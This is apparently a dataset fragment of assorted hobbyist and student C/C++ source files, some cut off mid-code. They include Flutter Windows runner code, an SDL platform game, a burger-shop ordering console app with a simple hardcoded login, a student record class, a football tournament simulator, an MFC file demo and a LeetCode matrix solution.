    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\n#define _USE_MATH_DEFINES\n#include<math.h>\n#include<stdio.h>\n#include<string.h>\n\nextern \"C\" {\n#include\"./SDL2-2.0.10/include/SDL.h\"\n#include\"./SDL2-2.0.10/include/SDL_main.h\"\n}\n\n#define FPS 150\n#define TARGET_TIME (1000/FPS)\n\n#define SCREEN_WIDTH\t680\n#define SCREEN_HEIGHT\t520\n#define PLATFORM_DIFF\t70\t\n#define POCZATKOWA_X_GR (SCREEN_WIDTH - (SCREEN_WIDTH * 0.96))\t// 0.95 / 0.15\n#define POCZATKOWA_Y_GR (SCREEN_HEIGHT - 43)\t// poczatkowa 43 / 403\n#define LICZBA_ETAPOW 3\n#define LICZBA_BECZEK 6\n\n#define PREDKOSC_POZIOMA\t\t160.00\n#define PREDKOSC_PIONOWA\t\t80.00\n#define PREDKOSC_GRAWITACYJNA\t120.00\n#define PREDKOSC_BECZKI\t\t\t100.0\n\n#define PLATFORMS_ONE\t7\t// iloscc platform na etap\n#define PLATFORMS_TWO\t10\n#define PLATFORMS_THREE\t10\t\n#define LADDERS_ONE\t\t6\t// ilosc drabin na etap\n#define LADDERS_TWO\t\t6\t\n#define LADDERS_THREE\t7\t\n\ntypedef struct {\n\tdouble x;\n\tdouble y;\n\tSDL_Rect rect;\n}Person;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Platform;\n\ntypedef struct {\n\tSDL_Rect rect;\n} Ladder;\n\ntypedef struct {\n\tfloat x;\n\tfloat y;\n\tint pkt_kontrolny;\n\tSDL_Rect rect;\n} Barrel;\n\ntypedef struct {\n\tint x, y, w, h;\n\tbool mysz;\n} Obszar;\n\n// narysowanie napisu txt na powierzchni screen, zaczynaj\u00b9c od punktu (x, y)\n// charset to bitmapa 128x128 zawieraj\u00b9ca znaki\nvoid DrawString(SDL_Surface* screen, int x, int y, const char* text, SDL_Surface* charset) {\n\tint px, py, c;\n\tSDL_Rect s, d;\n\ts.w = 8;\n\ts.h = 8;\n\td.w = 8;\n\td.h = 8;\n\twhile (*text) {\n\t\tc = *text & 255;\n\t\tpx = (c % 16) * 8;\n\t\tpy = (c / 16) * 8;\n\t\ts.x = px;\n\t\ts.y = py;\n\t\td.x = x;\n\t\td.y = y;\n\t\tSDL_BlitSurface(charset, &s, screen, &d);\n\t\tx += 8;\n\t\ttext++;\n\t};\n};\n\n\n// narysowanie na ekranie screen powierzchni sprite w punkcie (x, y)\n// (x, y) to punkt \u0153rodka obrazka sprite na ekranie\nvoid DrawSurface(SDL_Surface* screen, SDL_Surface* sprite, int x, int y) {\n\tSDL_Rect dest;\n\tdest.x = x - sprite->w / 2;\n\tdest.y = y - sprite->h / 2;\n\tdest.w = sprite->w;\n\tdest.h = sprite->h;\n\tSDL_BlitSurface(sprite, NULL, screen, &dest);\n};\n\n\n// rysowanie pojedynczego pixela\nvoid DrawPixel(SDL_Surface* surface, int x, int y, Uint32 color) {\n\tint bpp = surface->format->BytesPerPixel;\n\tUint8* p = (Uint8*)surface->pixels + y * surface->pitch + x * bpp;\n\t*(Uint32*)p = color;\n};\n\n\n// rysowanie linii o d\u00b3ugo\u0153ci l w pionie (gdy dx = 0, dy = 1) \n// b\u00b9d\u0178 poziomie (gdy dx = 1, dy = 0)\nvoid DrawLine(SDL_Surface* screen, int x, int y, int l, int dx, int dy, Uint32 color) {\n\tfor (int i = 0; i < l; i++) {\n\t\tDrawPixel(screen, x, y, color);\n\t\tx += dx;\n\t\ty += dy;\n\t};\n};\n\n\n// rysowanie prostok\u00b9ta o d\u00b3ugo\u0153ci bok\u00f3w l i k\nvoid DrawRectangle(SDL_Surface* screen, int x, int y, int l, int k,\n\tUint32 outlineColor, Uint32 fillColor) {\n\tint i;\n\tDrawLine(screen, x, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x + l - 1, y, k, 0, 1, outlineColor);\n\tDrawLine(screen, x, y, l, 1, 0, outlineColor);\n\tDrawLine(screen, x, y + k - 1, l, 1, 0, outlineColor);\n\tfor (i = y + 1; i < y + k - 1; i++)\n\t\tDrawLine(screen, x + 1, i, l - 2, 1, 0, fillColor);\n};\n\nint checkCollision(SDL_Rect rect1, SDL_Rect rect2) {\n\treturn rect1.x < rect2.x + rect2.w &&\n\t\trect1.x + rect1.w > rect2.x &&\n\t\trect1.y < rect2.y + rect2.h &&\n\t\trect1.y + rect1.h > rect2.y;\n};\n\nbool checkCollisionAtPosition(const Platform& platform, const Ladder& drabina, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9 i drabin\u00b9\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, drabina.rect);\n}\n\nbool checkCollisionAtPositionSide(const Platform& platform, Person gracz, int x, int y) {\n\tSDL_Rect positionRect = { x, y, 1, 1 };  // Tworzymy jednopikselowy prostok\u00b9t w danym miejscu\n\n\t// Sprawdzenie kolizji z platform\u00b9  i graczem od boku\n\treturn checkCollision(positionRect, platform.rect) && checkCollision(positionRect, gracz.rect);\n}\n\nint czyMyszNadObszarem(int x, int y, const Obszar* obszar) {\n\treturn (x >= obszar->x && x <= obszar->x + obszar->w &&\n\t\ty >= obszar->y && y <= obszar->y + obszar->h);\n}\n\nbool restartEtapu(double* worldTime, Person* gracz) {\n\t*worldTime = 0;\n\n\tgracz->x = (double)(POCZATKOWA_X_GR);\n\tgracz->y = (double)(POCZATKOWA_Y_GR);\n\n\tgracz->rect.x = (int)gracz->x;\n\tgracz->rect.y = (int)gracz->y;\n\n\treturn true;\n};\n// PIERWSZY ETAP\nvoid rysujPierwszy(SDL_Surface* screen, Platform platforms_one[PLATFORMS_ONE], SDL_Surface* drabina, SDL_Surface* flaga, SDL_Surface* ksiezniczka, SDL_Surface* beczka, Uint32 zielony, Uint32 czerwony) {\n\n\tfor (int i = 0; i < PLATFORMS_ONE; i++) {\n\t\tDrawRectangle(screen, platforms_one[i].rect.x, platforms_one[i].rect.y, platforms_one[i].rect.w, platforms_one[i].rect.h, zielony, czerwony);\n\t}\n\n\t// DRABINA\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 50);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 120);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 190);\n\tDrawSurface(screen, drabina, 100, SCREEN_HEIGHT - 260);\n\tDrawSurface(screen, drabina, SCREEN_WIDTH - 100, SCREEN_HEIGHT - 330)",
    "#include <iostream>\r\n#include <string.h>\r\n#include <conio.h>\r\n#include <stdlib.h>\r\n#include <stdio.h>\r\n#include <iomanip>\r\n\r\nusing namespace std;\r\n\r\nvoid menu();\r\nvoid order();\r\n\r\nint main(void){\r\n\t\r\n\tchar username[10], password[8], x;\r\n\tint i;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout<<\"--------------LOGIN--------------\"<<endl;\r\n\tcout<<\"---------------------------------\"<<endl;\r\n\tcout << \"Username:\";\r\n\tcin >> username;\r\n\tcout << \"Password:\";\r\n\t\t\r\n\tfor (i = 0;;){\r\n\tx = getch();\r\n\t\r\n\tif((x >='a' && x <= 'z') || (x >='A' && x <='Z') || (x >='0' && x <= '9')){\r\n\t\tpassword[i] = x;\r\n\t\ti++;\r\n\t\tcout << \"*\";\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\b' && i >= 1){\r\n\t\tcout << \"\\b \\b\";\r\n\t\ti--;\r\n\t\t}\r\n\t\t\r\n\telse if(x =='\\r'){\r\n\t\tpassword[i]='\\0';\r\n\t\tbreak;\r\n\t\t}\r\n}\r\n\r\n\t\r\n\tif (!strcmp(username, \"Keenan\") && !strcmp(password, \"pa55w0rd\")){\r\n\tcout << \"\\nAccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Thomas\") && !strcmp(password, \"Lizares\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\t\r\n\telse if(!strcmp(username, \"Burger\") && !strcmp(password, \"Town69\")){\r\n\tcout << \"\\nAcccess Granted, Welcome!\\n\";\r\n\tsystem(\"PAUSE\");\t\r\n\tsystem(\"CLS\");\r\n\tmenu();\r\n\torder();\r\n\t}\r\n\r\nelse{\r\n\tcout << \"\\nAccess Denied...\";\r\n}\r\n}\r\nvoid menu(){\r\n   \tcout<<\"                        |\\ /| /|_/|\"<<endl;\r\n\tcout<<\"                      |\\||-|\\||-/|/|\"<<endl;  \r\n\tcout<<\"                       \\\\|\\|//||///\"<<endl;  \r\n\tcout<<\"      _..----.._       |\\/\\||//||||\"<<endl;  \r\n\tcout<<\"    .'     o    '.     |||\\\\|/\\\\ ||\"<<endl;  \r\n\tcout<<\"   /   o       o  \\    | './\\_/.' |\"<<endl;  \r\n\tcout<<\"  |o        o     o|   |          |\"<<endl;  \r\n\tcout<<\"  /'-.._o     __.-'\\   |          |\"<<endl;  \r\n\tcout<<\"  \\      `````     /   |          |\"<<endl;  \r\n\tcout<<\"  |``--........--'`|    '.______.'\"<<endl;  \r\n\tcout<<\"   \\              /\"<<endl;  \r\n\tcout<<\"    `'----------'`\"<<endl;  \r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\tcout<<\"--------------WELCOME TO BURGER TOWN!--------------\\n\"<<endl;\r\n\tcout<<\"---------------------------------------------------\\n\"<<endl;\r\n\t\r\n\tcout<<\"\t\t\t---MENU---\t\t\t\t\t\t\\n\";\r\n\tcout<<\"\t\t\t-BURGERS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(1)141 Special (Cheeseburger)\t\t-\tP125\\n\";\r\n\tcout<<\"(2)141 Deluxe (Double Cheeseburger)\t-\tP155\\n\";\r\n\tcout<<\"(3)The 75th (Quarter pounder burger)\t-\tP145\\n\";\r\n\tcout<<\"(4)Gulag Shower (Fish Fillet Burger)\t-\tP155\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-PIZZAS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(5)Bacon Machine Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(6)Foley's Cheese Pizza\t\t\t-\tP255\\n\";\r\n\tcout<<\"(7)Pepperoni Pizza\t\t\t-\tP250\\n\";\r\n\tcout<<\"(8)J. Allen's Hawaiian Pizza \t\t-\tP285\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-MAINS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(9)Shepherd's Steak\t\t\t-\tP175\\n\";\r\n\tcout<<\"(10)Nikolai's Rib-eye\t\t\t-\tP165\\n\";\r\n\tcout<<\"(11)Dunn's Chicken and Rice\t\t-\tP110\\n\";\r\n\tcout<<\"(12)Wade's demise (Grilled Pork Chops)\t-\tP130\\n\";\r\n\tcout<<\"(13)Gary Sanderson's Spaghetti \t\t-\tP85\\n\";\r\n\tcout<<\"(14)8 pcs Chicken Nuggets\t\t-\tP105\\n\";\r\n\t\r\n\tcout<<\"\\n\t\t\t-ADD-ONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(15)Extra rice\t\t\t\t-\tP25\\n\";\r\n\tcout<<\"(16)Fries\t\t\t\t-\tP35\\n\";\r\n\r\n\tcout<<\"\\n\t\t\t-DRINKS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"(17)Bottled Water\t\t\t-\tP20\\n\";\r\n\tcout<<\"(18)Iced Tea\t\t\t\t-\tP35\\n\";\r\n\tcout<<\"(19)Lemonade\t\t\t\t-\tP30\\n\";\r\n\tcout<<\"(20)Chocolate Milkshake\t\t\t-\tP95\\n\";\r\n\t\r\n}\r\nvoid order(){\r\n\tint option, count=0, choice[100], quantity[100], discount;\r\n\tfloat total, payment, change, temporary[100];\r\n\t\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"\t\t    -OPTIONS-\t\t\t\t\t\t\\n\";\r\n\tcout<<\"---------------------------------------------------\\n\";\r\n\tcout<<\"(1) Order\\n\";\r\n\tcout<<\"(2) Exit\\n\";\r\n\t\r\nwhile (option !=1 && option !=2){\r\n\tcout << \"Enter an Option:\";\r\n\tcin >> option;\r\n}\r\n\tif (option == 1){\r\n\t\r\n\twhile (choice[count]!= 21){\r\n\tcout << \"\\nChoice (Item Number):\";\r\n\tcin >> choice[count];\r\n\r\n\t\r\n\tif (choice[count] == 1){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 125;\r\n\t\ttemporary[count] = quantity[count] * 125;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\r\n\t\tcount += 1;\t\t\r\n\t}\r\n\t\telse if (choice[count] == 2){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 3){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 145;\r\n\t\ttemporary[count] = quantity[count] * 145;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 4){\r\n\t\tcout << \"Quantity:\";\r\n\t\tcin >> quantity[count];\r\n\t\ttotal += quantity[count] * 155;\r\n\t\ttemporary[count] = quantity[count] * 155;\r\n\t\tcout << \"Total: P\" << temporary[count] << \"\\n\";\r\n\t\tcout << \"(21)Confirm Order\\n\";\t\t\r\n\t\tcount += 1;\r\n\t}\r\n\t\telse if (choice[count] == 5){\r\n\t\tcout << \"",
    "#include \"studentRecord.h\"\n#include \"not_found_err.h\"\n\n// constructor with default values\nStudentRecord::StudentRecord() {\n  this->id = 0;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id specified\nStudentRecord::StudentRecord(int id) {\n  this->id = id;\n  this->name = \"INVALID\";\n  this->age = 0;\n}\n\n// overloaded constructor with id and name specified\nStudentRecord::StudentRecord(int id, std::string name) {\n  this->id = id;\n  this->name = name;\n  this->age = 0;\n}\n\n// overloaded constructor with id, name and age specified\nStudentRecord::StudentRecord(int id, std::string name, int age) {\n  this->id = id;\n  this->name = name;\n  this->age = age;\n}\n\n// create a student record and push back the pointer to the vector in argument\n// function is > 80 chars, but I dunno how to make it look good split...\nvoid StudentRecord::addRecord(int id, std::string name, int age, std::vector<StudentRecord*>& allRecords) {\n  StudentRecord* record = new StudentRecord(id, name, age);\n  allRecords.push_back(record);\n\n}\n\n// find and fetch a specific record and return the pointer to the record in\n// function is > 80 chars, but I dunno how to make it look good split...\nStudentRecord* StudentRecord::fetchRecord(int id, std::vector<StudentRecord*>& allRecords) {\n  for (auto i : allRecords) {\n    if (i->id == id)\n      return i;\n  }\n  // throw if not found\n  throw (not_found_err());\n}\n\n//--------------getters------------------------\n\nint StudentRecord::getId() {\n  return this->id;\n}\n\nstd::string StudentRecord::getName() {\n  return this->name;\n}\n\nint StudentRecord::getAge() {\n  return this->age;\n}",
    "#include <iostream>\n#include <vector>\n#include <fstream>\n#include <cstdlib>\n#include <ctime>\n#include <algorithm>\n\nusing namespace std;\n\nstruct Equipo {\n    string nombre;\n    string estadio;\n    int puntos;\n    int golesMarcados;\n    bool eliminado;\n};\n\nvoid jugarPartido(Equipo &equipoLocal, Equipo &equipoVisitante, const string &estadio, bool faseEliminatoria) {\n    equipoLocal.golesMarcados = rand() % 5;\n    equipoVisitante.golesMarcados = rand() % 5;\n\n    cout << equipoLocal.nombre << \" \" << equipoLocal.golesMarcados << \" - \" << equipoVisitante.golesMarcados << \" \" << equipoVisitante.nombre << \"   - \" << estadio << endl;\n\n    if (faseEliminatoria) {\n        if (equipoLocal.golesMarcados == equipoVisitante.golesMarcados) {\n            // En caso de empate, jugamos una tanda de penales hasta que haya un ganador\n            while (equipoLocal.golesMarcados == equipoVisitante.golesMarcados) {\n                equipoLocal.golesMarcados = rand() % 6; // Nuevo resultado de penales para el equipo local\n                equipoVisitante.golesMarcados = rand() % 6; // Nuevo resultado de penales para el equipo visitante\n            }\n\n            cout << \"\u00a1Vamos a la tanda de penales!\\n\";\n            cout << \"Goles en penales: \" << equipoLocal.nombre << \" \" << equipoLocal.golesMarcados << \" - \" << equipoVisitante.golesMarcados << \" \" << equipoVisitante.nombre << endl;\n\n            if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n                equipoLocal.puntos += 2;\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 2;\n                equipoLocal.eliminado = true;\n            }\n        } else {\n            if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n                equipoLocal.puntos += 3;\n                equipoVisitante.eliminado = true;\n            } else {\n                equipoVisitante.puntos += 3;\n                equipoLocal.eliminado = true;\n            }\n        }\n    } else {\n        if (equipoLocal.golesMarcados > equipoVisitante.golesMarcados) {\n            equipoLocal.puntos += 3;\n        } else if (equipoLocal.golesMarcados < equipoVisitante.golesMarcados) {\n            equipoVisitante.puntos += 3;\n        } else {\n            equipoLocal.puntos += 1;\n            equipoVisitante.puntos += 1;\n        }\n    }\n}\n\nvoid simularFaseGrupos(vector<vector<Equipo>> &grupos) {\n    for (size_t i = 0; i < grupos.size(); ++i) {\n        cout << \"---- Grupo \" << (i + 1) << \" ----\\n\";\n\n        int numEquipos = grupos[i].size();\n\n        for (int j = 0; j < numEquipos; ++j) {\n            for (int k = j + 1; k < numEquipos; ++k) {\n                jugarPartido(grupos[i][j], grupos[i][k], grupos[i][j].estadio, false);\n            }\n        }\n\n        sort(grupos[i].begin(), grupos[i].end(), [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        cout << \"\\nTabla de posiciones del grupo \" << (i + 1) << \"\\n\";\n        cout << \"Equipo\\t\\tPuntos\\n\";\n        for (const auto &equipo : grupos[i]) {\n            cout << equipo.nombre << \"\\t\\t\" << equipo.puntos << \"\\n\";\n        }\n        cout << \"------------------------\\n\\n\";\n    }\n}\n\nvoid simularEliminatorias(vector<Equipo> &equipos, const string &nombreRonda, bool faseEliminatoria) {\n    cout << \"\\n  \" << nombreRonda << \"   \\n\";\n\n    random_shuffle(equipos.begin(), equipos.end());\n\n    for (int i = 0; i < equipos.size(); i += 2) {\n        if (!equipos[i].eliminado && !equipos[i + 1].eliminado) {\n            jugarPartido(equipos[i], equipos[i + 1], equipos[i].estadio, faseEliminatoria);\n        }\n    }\n}\n\nvoid generarGrupos(vector<Equipo> &equipos, vector<vector<Equipo>> &grupos) {\n    int numGrupos = equipos.size() / 4;\n    grupos.resize(numGrupos);\n\n    for (int i = 0; i < numGrupos; ++i) {\n        sort(equipos.begin() + i * 4, equipos.begin() + (i + 1) * 4, [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        grupos[i] = vector<Equipo>(equipos.begin() + i * 4, equipos.begin() + (i + 1) * 4);\n    }\n}\n\nvoid simularCopaAmerica() {\n    srand(time(0));\n\n    vector<Equipo> equipos;\n\n    ifstream archivoEquipos(\"equipos.txt\");\n\n    if (!archivoEquipos.is_open()) {\n        cerr << \"No se pudo abrir el archivo de equipos\" << endl;\n        return;\n    }\n\n    string nombreEquipo;\n    vector<string> nombresEstadios = {\"Allegiant Stadium\", \"Las Vegas\", \"Nevada\", \"AT&T Stadium\", \" Arlington\", \" Texas\", \"Bank of America Stadium\", \" Charlotte\", \"North Carolina\", \"Children's Mercy Park\", \" Kansas City\", \"Kansas\"};\n\n    while (getline(archivoEquipos, nombreEquipo)) {\n        string nombreEstadio = nombresEstadios[rand() % nombresEstadios.size()];\n        equipos.push_back({nombreEquipo, nombreEstadio, 0, 0, false});\n    }\n\n    archivoEquipos.close();\n\n    vector<vector<Equipo>> grupos;\n    generarGrupos(equipos, grupos);\n\n    simularFaseGrupos(grupos);\n\n    vector<Equipo> equiposCuartos;\n    for (const auto &",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"spotify\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <afxwin.h>\n\nclass CMainFrame : public CFrameWnd {\npublic:\n    CMainFrame() {\n        Create(NULL, _T(\"MFC Application Tutorial\"));\n        WriteToFile(_T(\"test.txt\"), _T(\"Hello, MFC File Handling!\\n\"));\n        CString content = ReadFromFile(_T(\"test.txt\"));\n        MessageBox(content, _T(\"File Content\"), MB_OK);\n    }\n\n    void WriteToFile(const CString& fileName, const CString& text) {\n        CFile file;\n        if (file.Open(fileName, CFile::modeCreate | CFile::modeWrite)) {\n            file.Write((LPCTSTR)text, text.GetLength() * sizeof(TCHAR));\n            file.Close();\n        } else {\n            MessageBox(_T(\"Failed to write to file.\"), _T(\"Error\"), MB_ICONERROR);\n        }\n    }\n\n    CString ReadFromFile(const CString& fileName) {\n        CFile file;\n        CList<CString> ls;\n        CString content;\n        if (file.Open(fileName, CFile::modeRead)) {\n            ULONGLONG fileSize = file.GetLength();\n            // \u5206\u914d\u4e00\u4e2a\u8db3\u591f\u5927\u7684\u7f13\u51b2\u533a\u6765\u5b58\u50a8\u6587\u4ef6\u5185\u5bb9\n            wchar_t* buffer = content.GetBufferSetLength((int)fileSize);\n            file.Read(buffer, (UINT)fileSize * sizeof(wchar_t)); // \u786e\u4fdd\u6309 wchar_t \u7684\u5927\u5c0f\u8bfb\u53d6\n            content.ReleaseBuffer();\n            file.Close();\n        } else {\n            MessageBox(_T(\"Failed to read from file.\"), _T(\"Error\"), MB_ICONERROR);\n        }\n        return content;\n    }\n\n};\n\nclass CMyApp : public CWinApp {\npublic:\n    BOOL InitInstance() override {\n        m_pMainWnd = new CMainFrame();\n        m_pMainWnd->ShowWindow(SW_NORMAL);\n        m_pMainWnd->UpdateWindow();\n        return TRUE;\n    }\n};\n\nCMyApp theApp;\n\n//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n//    return theApp.Run();\n//}\n\n// \u5e94\u7528\u7a0b\u5e8f\u5165\u53e3\u70b9\n//int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)\n//{\n//    // \u521d\u59cb\u5316 MFC \u5e93\n//    if (!AfxWinInit(hInstance, hPrevInstance, lpCmdLine, nCmdShow))\n//    {\n//        // \u521d\u59cb\u5316\u5931\u8d25\n//        return FALSE;\n//    }\n//\n//    // \u521b\u5efa\u5e94\u7528\u7a0b\u5e8f\u5bf9\u8c61\n//    CMyApp myApp;\n//\n//    // \u521d\u59cb\u5316\u5e94\u7528\u7a0b\u5e8f\u5bf9\u8c61\n//    if (!myApp.InitInstance())\n//    {\n//        // \u521d\u59cb\u5316\u5931\u8d25\n//        return FALSE;\n//    }\n//\n//    // \u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u6d88\u606f\u5faa\u73af\n//    return myApp.Run();\n//}\n\nint AFXAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,\n                      _In_ LPTSTR lpCmdLine, int nCmdShow)\n{\n    ASSERT(hPrevInstance == NULL);\n\n    int nReturnCode = -1;\n    CWinThread* pThread = AfxGetThread();\n    CWinApp* pApp = AfxGetApp();\n\n    // AFX internal initialization\n    if (!AfxWinInit(hInstance, hPrevInstance, lpCmdLine, nCmdShow))\n        goto InitFailure;\n\n    // App global initializations (rare)\n    if (pApp != NULL && !pApp->InitApplication())\n        goto InitFailure;\n\n    // Perform specific initializations\n    if (!pThread->InitInstance())\n    {\n        if (pThread->m_pMainWnd != NULL)\n        {\n            TRACE(traceAppMsg, 0, \"Warning: Destroying non-NULL m_pMainWnd\\n\");\n            pThread->m_pMainWnd->DestroyWindow();\n        }\n        nReturnCode = pThread->ExitInstance();\n        goto InitFailure;\n    }\n    nReturnCode = pThread->Run();\n\n    InitFailure:\n#ifdef _DEBUG\n    // Check for missing AfxLockTempMap calls\n    if (AfxGetModuleThreadState()->m_nTempMapLock != 0)\n    {\n        TRACE(traceAppMsg, 0, \"Warning: Temp map lock count non-zero (%ld).\\n\",\n              AfxGetModuleThreadState()->m_nTempMapLock);\n    }\n    AfxLockTempMaps();\n    AfxUnlockTempMaps(-1);\n#endif\n\n    AfxWinTerm();\n    return nReturnCode;\n}",
    "#include<iostream>\n#include<vector>\nusing namespace std;\nint main()\n{\nclass Solution {\npublic:\n    void setZeroes(vector<vector<int>>& arr) {\n        int m = arr.size();\n        int n =arr[0].size();\n        vector<bool>row(m,false);\n        vector<bool>col(n,false);\n        \n        for(int i=0;i<m;i++)\n        {\n            for(int j=0;j<n;j++)\n            {\n                if(arr[i][j]==0)\n                {\n                    row[i] =true;// true means 0 set karna hai\n                    col[j] =true;\n                }\n            }\n        }\n        \n        // set rows zero\n        for(int i=0;i<m;i++)\n        {\n            if(row[i]==true)\n            {\n                for(int j=0;j<n;j++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n         // set cols zero\n        for(int j=0;j<n;j++)\n        {\n            if(col[j]==true)\n            {\n                for(int i=0;i<m;i++)\n                {\n                    arr[i][j] =0;\n                }\n            }\n        }\n        \n        \n    }\n};\n}\n/*\nGiven an m x n integer matrix matrix, if an element is 0, set its entire row and column to 0's.\n\nYou must do it in place.\nExample 1:\nInput: matrix = [[1,1,1],[1,0,1],[1,1,1]]\nOutput: [[1,0,1],[0,0,0],[1,0,1]]\n*/",
